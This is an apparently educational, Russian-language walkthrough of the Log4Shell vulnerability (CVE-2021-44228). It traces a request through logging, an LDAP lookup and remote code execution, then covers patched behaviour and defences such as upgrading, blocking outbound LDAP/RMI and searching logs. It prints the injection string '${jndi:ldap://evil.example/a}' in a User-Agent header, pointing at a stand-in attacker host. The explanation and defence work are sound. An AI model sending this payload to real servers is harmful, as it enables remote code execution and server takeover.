## Шаги

### `header` Странный заголовок

`attacker → server` · `attack`
Сообщение: GET /search · Итог: принят как обычный запрос

```http
GET /search?q=socks
User-Agent: ⟦${jndi:ldap://evil.example/a}⟧
```

#### Просто

Атакующий ищет в интернет-магазине носки. Но в служебное поле запроса, где браузер обычно
называет себя, он вписал **странную строку** со знаком доллара и фигурными скобками.

#### По шагам

Запрос выглядит обычным: поиск по слову `socks`. Странная строка стоит в заголовке
`User-Agent`. Сервер её не проверяет: этот заголовок нужен ему только для статистики.

#### Глубже

Строку можно положить в любое место, которое сервер потом запишет в журнал: заголовок, поле
формы, имя пользователя, поисковый запрос. Поэтому атака не требует ни входа, ни действий
человека: в векторе CVSS это `PR:N` и `UI:N`. Слова `jndi` и `ldap` здесь не случайны — их
смысл станет ясен на следующих шагах.

### `write` Запись в журнал

`server → log` · `attack` · `without-defence`
Сообщение: запись: ${jndi:…} · Итог: библиотека разбирает строку

```text
INFO search q=socks agent=⟦${jndi:ldap://evil.example/a}⟧
```

#### Просто

Сервер честно записывает каждый запрос в **журнал** — так делают почти все программы. Но
библиотека журнала не просто пишет текст: она ищет в нём **подстановки** вида `${…}` и
выполняет их.

#### По шагам

Сервер передаёт строку библиотеке Log4j. Та видит в ней `${jndi:…}` и вместо того, чтобы
записать как есть, решает узнать, что за этим стоит.

#### Глубже

Подстановки в Log4j задуманы для удобства: например, вставить в запись имя машины или
значение настройки. Беда в том, что они срабатывали и внутри самого сообщения, которое пришло
снаружи. Данные посетителя становились командой для библиотеки. NVD относит эту ошибку к
CWE-917 — инъекции в язык выражений.

### `lookup` Поход за ответом

`log → ldap` · `attack` · `without-defence`
Сообщение: LDAP-запрос: a · Итог: соединение наружу

```text
JNDI → ⟦ldap://evil.example/a⟧
```

#### Просто

Библиотека журнала **сама идёт в интернет** по адресу из строки — на сервер, который
принадлежит атакующему. Сайт только хотел записать строчку в журнал.

#### По шагам

Подстановка `jndi` велит спросить имя `a` у службы каталогов по адресу `evil.example`. Сервер
магазина открывает исходящее соединение к серверу атакующего.

#### Глубже

JNDI — встроенный в Java способ искать объекты по имени в разных каталогах. LDAP — протокол
таких каталогов (RFC 4511). JNDI умеет и другие протоколы: CISA советовала закрыть серверам
исходящие LDAP и RMI, а DNS — напрямую, в обход DNS-сервера компании. Даже без дальнейших шагов этот запрос выдаёт атакующему, что сервер
уязвим.

### `reply` Ответ с подвохом

`ldap → log` · `attack` · `without-defence`
Сообщение: ответ: объект Java · Итог: принят

#### Просто

Сервер атакующего отвечает: «вот твой объект». На деле в ответе **программа**, которую
подготовил атакующий.

#### По шагам

Ответ каталога описывает объект Java: где лежит его код или сам объект в упакованном виде.
Java на сервере магазина берёт его, чтобы собрать результат подстановки.

#### Глубже

Ответ каталога доверенным считался по умолчанию. Если он указывает, откуда загрузить класс, или
несёт сериализованный объект, Java его загружает или распаковывает. Распаковка присланных
чужих данных — отдельный класс ошибок, CWE-502; Apache указал его среди слабостей этой
уязвимости.

### `run` Чужой код на сервере

`server → attacker` · `attack` · `without-defence`
Сообщение: обратное подключение · Итог: сервер под контролем

#### Просто

Код атакующего **выполняется на сервере магазина** с теми же правами, что и сам сайт.
Например, он открывает атакующему дверь: сервер сам подключается к нему и ждёт команд.

#### По шагам

Атакующий получает командную строку сервера. Он может читать базу клиентов, ставить свои
программы, идти дальше во внутреннюю сеть.

#### Глубже

Это удалённое выполнение кода без пароля и без участия человека. Поэтому базовая оценка — 10.0
из 10 по CVSS 3.1: атака по сети, простая, без прав и действий пользователя, страдает всё —
конфиденциальность, целостность и доступность; `S:C` значит, что ущерб выходит за пределы
уязвимой библиотеки. В ATT&CK это техника T1190 — взлом приложения, открытого в интернет.

### `patched` Обновлённая библиотека

`server → log` · `attack` · `with-defence` · `stopped`
Сообщение: запись: ${jndi:…} · Итог: записано как текст, атака не сработала

```text
INFO search q=socks agent=⟦${jndi:ldap://evil.example/a}⟧
```

#### Просто

Та же строка, но библиотека журнала **обновлена**. Теперь она записывает сообщение как
обычный текст и никуда не ходит. В журнале остаётся след атаки, и только.

#### По шагам

Строка `${jndi:…}` попадает в журнал знак за знаком. Исходящего соединения нет, ответа от
сервера атакующего нет, чужой код не загружается.

#### Глубже

По NVD уязвимы версии Log4j от 2.0-beta9; в 2.15.0 подстановки в сообщениях выключены по
умолчанию, с 2.16.0 (и в 2.12.2, 2.3.1 для старых Java) эта возможность удалена. Исправление в
2.15.0 оказалось неполным: при особых настройках журнала атака всё ещё проходила
(CVE-2021-45046), закрыла её версия 2.16.0. Позже нашлись и другие связанные ошибки, и CISA рекомендовала 2.17.1 для Java 8, 2.12.4 для Java 7 и 2.3.2 для Java 6.
Обновления одной лишь Java мало: обновлять нужно саму библиотеку. CISA внесла CVE-2021-44228 в
каталог известных эксплуатируемых уязвимостей (KEV) 10 декабря 2021 года.

### `answer` Обычный ответ

`server → attacker` · `safe` · `with-defence`
Сообщение: 200 OK · Итог: результаты поиска

#### Просто

Атакующий получает список носков, как любой покупатель. Атака не удалась.

#### По шагам

Сервер отвечает на поиск как обычно. Странный заголовок ни на что не повлиял.

#### Глубже

Даже на обновлённом сервере полезен второй рубеж: если серверу магазина запрещено ходить в
интернет самому, шаг «Поход за ответом» оборвался бы и на старой библиотеке. А строки
`${jndi:` в журнале подскажут, кто и когда пробовал атаку.

## Как защититься

- **Обновить библиотеку.** Это главная защита: поставить исправленную версию Log4j. Обновления
  одной лишь Java мало. Сначала — серверы, открытые в интернет.
- **Знать, где она стоит.** Log4j часто приходит внутри чужих программ и других библиотек. CISA
  советовала составить список всех систем с Log4j, включая внутренние и облачные.
- **Временная мера, если обновить нельзя.** CISA описывала удаление класса `JndiLookup` из
  библиотеки. Это заплатка, а не замена обновлению.
- **Закрыть исходящие соединения.** Серверу магазина незачем самому ходить в интернет по LDAP
  или RMI, а DNS-запросы он может слать только через DNS-сервер компании. Разрешённые адреса задаются списком.
- **Не верить данным снаружи.** Всё, что прислал посетитель, — только текст, даже когда его
  пишут в журнал.
- **Искать следы.** Журналы уязвимых систем содержат строки атакующих: по ним видно попытки
  атаки, а признаки успешного взлома нужно проверить отдельно.
